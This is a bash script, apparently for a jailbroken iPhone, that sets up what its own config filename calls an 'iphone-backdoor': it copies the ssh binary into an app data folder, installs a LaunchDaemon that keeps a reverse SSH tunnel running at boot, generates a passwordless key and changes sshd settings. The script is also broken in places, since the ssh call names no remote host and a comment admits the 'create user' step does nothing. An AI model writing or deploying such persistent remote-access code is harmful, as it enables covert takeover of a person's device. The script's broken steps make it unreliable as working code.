#!/bin/bash

set -euo pipefail

# Assuming you have a valid method to determine the unique identifier
# For demonstration, setting a placeholder value
unique_identifier="unique-identifier-placeholder"

user_home="/var/mobile/Containers/Data/Application/$unique_identifier"
ssh_binary_path="$user_home/ssh"
launch_daemon_path="/Library/LaunchDaemons/com.example.ssh.plist"
ssh_key_path="$user_home/id_rsa"
ssh_config_dir="/etc/ssh/sshd_config.d"
ssh_config_file="$ssh_config_dir/99-iphone-backdoor.conf"

# Create a new user on the iPhone (this step is actually not creating a new user but setting a preference)
defaults write /var/mobile/Library/Preferences/com.apple.mobile.installation.plist userhome_uid 501

# Create a folder in the user's home directory
mkdir -p "$user_home"

# Copy the SSH binary to that folder
cp /usr/bin/ssh "$ssh_binary_path"

# Change permissions for the binary
chmod +x "$ssh_binary_path"

# Create a launch daemon to run the binary
cat << EOF > "$launch_daemon_path"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.ssh</string>
    <key>ProgramArguments</key>
    <array>
        <string>$ssh_binary_path</string>
        <string>-i</string>
        <string>$ssh_key_path</string>
        <string>-p</string>
        <string>2222</string>
        <string>-R</string>
        <string>8080:localhost:22</string>
    </array>
    <key>KeepAlive</key>
    <true/>
    <key>RunAtLoad</key>
    <true/>
    <key>UserName</key>
    <string>mobile</string>
</dict>
</plist>
EOF

# Load the launch daemon
launchctl load -w "$launch_daemon_path"

# Create the SSH key
ssh-keygen -t rsa -b 4096 -f "$ssh_key_path" -N ""

# Ensure the SSH config directory exists
mkdir -p "$ssh_config_dir"

# Create a new SSH config file
cat << EOF > "$ssh_config_file"
PasswordAuthentication no
EOF

# This assumes that the Include directive is not already present in your sshd_config
if ! grep -qxF 'Include /etc/ssh/sshd_config.d/*.conf' /etc/ssh/sshd_config; then
    echo "Include /etc/ssh/sshd_config.d/*.conf" >> /etc/ssh/sshd_config
fi

# Restart the SSH daemon (this command might need adjustment based on your system)
# For example, on a system using launchd for OpenSSH, you might reload the service like this:
launchctl stop com.openssh.sshd
launchctl start com.openssh.sshd
